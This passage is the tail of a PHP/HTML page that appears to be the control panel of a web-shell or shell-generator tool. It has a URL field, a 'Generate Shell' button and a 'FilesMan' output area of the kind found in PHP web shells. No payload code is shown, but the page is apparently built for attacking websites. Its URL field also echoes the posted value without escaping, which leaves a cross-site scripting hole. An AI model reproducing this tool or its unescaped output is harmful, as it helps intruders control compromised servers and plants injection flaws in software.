	<p><b>URL: </b><input type="text" class="form-control" style="width: 300px" value="<?php echo $_POST['url'];?>" name="url" id="url"><input class="btn btn-md btn-primary" type=submit name="submit" value="Submit">
	<input class="btn btn-md btn-primary" type="submit" name="gen" value="Generate Shell"><span style="float: right;"> <span class="btn btn-md btn-primary"><?php echo VER;?></span> <input class="btn btn-md btn-primary"  type="submit" name="exit" value="Exit"></span>
	</p>
	</form>
	<div id="FilesMan">
	  <?php echo $result[0];?>
	</div>
</div>
</div>
</body>
</html>
